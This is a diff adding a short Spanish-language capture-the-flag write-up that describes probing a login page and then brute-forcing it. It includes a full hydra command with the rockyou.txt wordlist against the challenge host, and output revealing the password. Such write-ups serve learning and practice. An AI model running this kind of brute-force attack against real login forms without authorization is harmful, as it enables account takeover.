@@ -1,0 +1,17 @@
+AL leer el enunciado menciona probar a fondo, en ese punto ya pense en hacer brute force aunque por lo general esta suele ser la ultima opcion. Intenta par de SQLi, intente ver si se creaba una cookie que se pudiera cambiar... pero nada. Así que puse ffuf para buscar más posibles directorios de la web e hydra con la wordlist rockyou.txt de fondo mientras investigaba un poco.
+Solo vi interesante el tema de CSFR pero no tenía sentido para este reto asi que seguí buscando vulnerabilidades de logins hechos con php pero nada. Hasta que miro a ver como va hydra y resulta que encuentra una contraseña.
+
+Comando:
+$ hydra -l "" -P /usr/share/wordlists/rockyou.txt chllngs.letsctf.com -s 53804  http-post-form "/:password=^PASS^:F=Wrong"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-23 23:24:55
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://chllngs.letsctf.com:53804/:password=^PASS^:F=Wrong
+[STATUS] 2174.00 tries/min, 2174 tries in 00:01h, 14342225 to do in 109:58h, 16 active
+[53804][http-post-form] host: chllngs.letsctf.com
+[STATUS] 2253.00 tries/min, 6759 tries in 00:03h, 14337640 to do in 106:04h, 16 active
+[STATUS] 2309.57 tries/min, 16167 tries in 00:07h, 14328232 to do in 103:24h, 16 active
+[53804][http-post-form] host: chllngs.letsctf.com   password: cameron7
+
